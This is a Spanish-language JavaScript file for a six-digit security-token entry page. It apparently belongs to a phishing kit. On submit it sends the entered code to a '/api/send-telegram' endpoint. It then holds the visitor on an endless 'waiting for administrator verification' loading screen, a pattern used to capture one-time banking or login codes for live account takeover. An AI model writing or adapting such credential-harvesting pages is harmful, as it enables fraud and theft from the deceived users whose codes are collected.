document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando página de token...');
    
    // Inicializar funciones comunes
    if (window.commonUtils) {
        window.commonUtils.initializeCommon();
    }
    
    const inputs = document.querySelectorAll('.token-input');
    const verifyButton = document.querySelector('.verify-btn');
    const backButton = document.querySelector('.back-btn');
    const abandonButton = document.querySelector('.abandon-btn');
    const errorMessage = document.querySelector('.error-message');

    // Verificar que los elementos existan
    if (!verifyButton || !inputs.length) {
        console.error('❌ Elementos del formulario no encontrados');
        return;
    }

    // Disable verify button by default
    verifyButton.disabled = true;

    // Check if all inputs are filled with valid numbers
    const checkInputs = () => {
        const allFilled = Array.from(inputs).every(input => /^[0-9]$/.test(input.value));
        verifyButton.disabled = !allFilled;
        
        if (allFilled) {
            verifyButton.classList.add('active');
        } else {
            verifyButton.classList.remove('active');
        }
    };

    // Reset error message when starting to input
    const resetError = () => {
        if (errorMessage) {
            errorMessage.style.display = 'none';
        }
    };

    // Auto-advance between token inputs
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            resetError();
            // Allow only numbers
            const value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value.slice(0, 1);

            if (value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                } else {
                    checkInputs();
                }
            }
            checkInputs();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace') {
                if (!e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
                resetError();
            }
        });

        // Paste handling
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
            
            pastedData.split('').forEach((char, i) => {
                if (i < inputs.length) {
                    inputs[i].value = char;
                }
            });

            if (pastedData.length > 0) {
                const nextEmptyIndex = Math.min(pastedData.length, inputs.length - 1);
                inputs[nextEmptyIndex].focus();
            }
            checkInputs();
        });
    });

    // Submit handler para el formulario de token
    verifyButton.addEventListener('click', async function(e) {
        e.preventDefault();
        console.log('📤 Formulario Token enviado');
        
        const token = Array.from(inputs).map(input => input.value).join('');

        if (token.length !== 6) {
            window.commonUtils.showError('Por favor ingrese el código completo de 6 dígitos');
            return;
        }

        if (window.isSubmitting) {
            console.log('Ya hay un envío en proceso');
            return;
        }

        window.isSubmitting = true;
        
        // USAR LOADING OVERLAY IDÉNTICO A INDEX.HTML
        if (window.loadingOverlay) {
            window.loadingOverlay.show('Enviando token para verificación...');
        } else {
            window.commonUtils.showLoading('Enviando token para verificación...');
        }

        const data = {
            tipo: 'Token',
            codigo: token,
            timestamp: new Date().toLocaleString()
        };

        try {
            console.log('Enviando token al servidor...');
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error('Error en la respuesta del servidor');
            }

            const result = await response.json();
            
            if (!result.success) {
                throw new Error(result.error || 'Error al procesar la solicitud');
            }

            console.log('Token enviado exitosamente, esperando respuesta del administrador...');
            
            sessionStorage.setItem('formData', JSON.stringify({
                tipo: 'Token',
                codigo: token
            }));

            // MANTENER PANTALLA DE CARGA INDEFINIDAMENTE
            if (window.loadingOverlay) {
                window.loadingOverlay.show('Token enviado. Esperando verificación del administrador...');
            } else {
                window.commonUtils.showLoading('Token enviado. Esperando verificación del administrador...');
            }

        } catch (error) {
            console.error('Error:', error);
            
            // OCULTAR LOADING OVERLAY EN CASO DE ERROR
            if (window.loadingOverlay) {
                window.loadingOverlay.hide();
            } else {
                window.commonUtils.hideLoading();
            }
            
            window.isSubmitting = false;
            if (errorMessage) {
                errorMessage.style.display = 'block';
            }
            window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
        }
    });

    if (backButton) {
        backButton.addEventListener('click', () => {
            window.history.back();
        });
    }

    if (abandonButton) {
        abandonButton.addEventListener('click', () => {
            if (confirm('¿Está seguro que desea abandonar el proceso?')) {
                window.location.href = 'index.html';
            }
        });
    }

    // Focus en el primer input al cargar
    inputs[0].focus();
});